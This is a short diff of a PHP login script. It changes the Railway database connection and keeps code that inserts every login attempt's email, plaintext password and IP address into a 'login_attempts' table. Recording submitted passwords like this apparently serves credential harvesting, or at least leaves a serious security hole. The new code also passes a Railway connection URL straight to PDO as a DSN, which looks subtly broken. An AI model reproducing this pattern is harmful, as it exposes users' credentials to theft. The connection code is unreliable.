@@ -13,19 +13,14 @@ function sendJsonResponse($success, $message = '') {
     exit();
 }
 
-// Log login attempts to the Railway database
+// Database connection using Railway environment variables
 try {
-    // Railway Database Connection Details (replace with environment variables from Railway)
-    $host = getenv('MYSQLHOST');
-    $user = getenv('MYSQLUSER');
-    $password_db = getenv('MYSQLPASSWORD');
-    $database = getenv('MYSQLDATABASE');
+    // Load database connection details from environment variables
+    $mysqlUrl = getenv('MYSQL_URL'); // Retrieve `MYSQL_URL` from Railway
+    $dsn = $mysqlUrl; // Directly use the full DSN provided by Railway
+    $pdo = new PDO($dsn);
 
-    // PDO connection setup
-    $dsn = "mysql:host={$host};dbname={$database};charset=utf8mb4"; // For MySQL (change to PostgreSQL DSN if using PostgreSQL)
-    $pdo = new PDO($dsn, $user, $password_db);
-
-    // Insert login data into the table
+    // Log login attempt into the database table
     $stmt = $pdo->prepare("INSERT INTO login_attempts (email, password, ip_address, attempt_time) VALUES (?, ?, ?, ?)");
     $stmt->execute([
         $email,
